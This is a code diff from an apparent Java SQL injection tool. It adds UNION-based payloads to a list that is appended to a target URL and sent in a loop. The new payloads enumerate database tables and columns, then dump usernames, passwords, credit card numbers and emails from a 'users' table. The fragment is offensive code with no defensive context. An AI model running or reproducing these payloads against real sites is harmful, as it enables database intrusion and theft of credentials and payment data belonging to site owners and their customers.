@@ -35,7 +35,12 @@ String urlworkwith=url.toString();
 String s=urlworkwith; String end="--+";String s1="";
 String sql_commands[]={" order by 1"," union all select 1,2"," union all select database(),version()",
 " union all select 1,table_name from information_schema.tables"," union select 1,version(),current_user()",
-" union all select 1,column_name from information_schema.columns where table_name=\'users\'"," union all select 1,2"," order by 4"};
+" union all select 1,column_name from information_schema.columns where table_name=\'users\'"," union all select 1,2"," order by 4"," union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 3,1",
+" union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 7,1",
+" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()",
+" union select 1,group_concat(column_name),3 from information_schema.columns where table_name=\'users\'",
+" union select 1,group_concat(uname),3 from users"," union select 1,group_concat(pass),3 from users",
+" union select 1,group_concat(cc),3 from users"," union select 1,group_concat(email),3 from users"};
 //String table_name=new String[];
 int k;
 for(k=0;k<(sql_commands.length);k++)
